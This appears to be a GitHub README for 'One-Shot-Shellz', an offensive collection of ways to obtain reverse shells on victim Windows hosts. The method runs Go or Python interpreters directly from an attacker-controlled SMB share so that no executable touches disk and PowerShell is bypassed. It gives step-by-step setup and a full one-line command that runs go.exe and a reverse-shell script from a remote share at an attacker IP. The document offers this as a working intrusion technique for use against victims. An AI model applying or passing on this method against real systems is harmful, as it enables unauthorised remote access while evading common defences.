# One-Shot-Shellz
## Abusing Remote Windows SMB Shares to Get Reverse Shells In Any Programming Language

This is my collection of ways to Execute Reverse Shells on a Victim Windows Host not using PowerShell or touching disk with an .exe.

More will be added as and when I have the time to research it.

The process is extremely simple.

1. Have a Windows Victim where you can run commands
2. Have a Windows Attack Box with your Programming Environment of choice - Python and Go are the only one I have tested so far
3. Have a Kali Box or NCat on your Windows Attack Box to catch the Reverse Shell
4. Share the Folder where your Python/Go.exe Application is
5. Have your Reverse Shell script also in the same folder
6. Run your one shot command in CMD/PowerShell i.e with Go it is `\\192.168.59.130\Go\go.exe run \\192.168.59.130\Go\shell.go` where `\\192.168.59.130\Go\` is the Attacker Controlled Remote Share and `run` for `go run` and `\\192.168.59.130\Go\shell.go` is the Reverse Shell Code.

  ![image](https://user-images.githubusercontent.com/130473605/235157805-16805cb8-0019-44a7-acb2-4717a273c60a.png)


7. Sit back and execute Go on a Windows Victim Host that doesnt have it installed.

**NB - Give it time, can take a while to drop in**

![image](https://user-images.githubusercontent.com/130473605/235159127-c5551ddd-07b3-408e-baa7-ec45869b56ab.png)
